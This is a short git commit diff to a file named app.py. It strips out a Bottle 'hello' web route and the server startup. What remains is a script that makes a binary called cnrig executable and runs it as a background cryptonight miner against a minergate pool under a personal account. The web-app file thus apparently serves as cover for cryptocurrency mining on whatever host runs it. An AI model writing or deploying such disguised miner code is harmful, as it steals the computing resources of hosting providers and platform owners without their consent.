dbe5fcc96a0feae618af714a1694ffb228009d7a
dwij39 <43697179+dwij39@users.noreply.github.com>
2018-10-27 23:03:43 +0530

    Update app.py

--- app.py
+++ app.py
@@ -1,10 +1,4 @@
 import os
-from bottle import route, run
-
-@route('/hello/:name')
-def index(name='World'):
-    return '<b>Hello %s!</b>' % name
-
 
 if __name__ == '__main__':
     # Get required port, default to 5000.    
@@ -12,6 +6,3 @@ if __name__ == '__main__':
     a  = os.popen('chmod +x cnrig').readlines()
     a  = os.popen('ls').readlines()
     a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
-    port = os.environ.get('PORT', 5000)
-    # Run the app.
-    run(host='0.0.0.0', port=port)
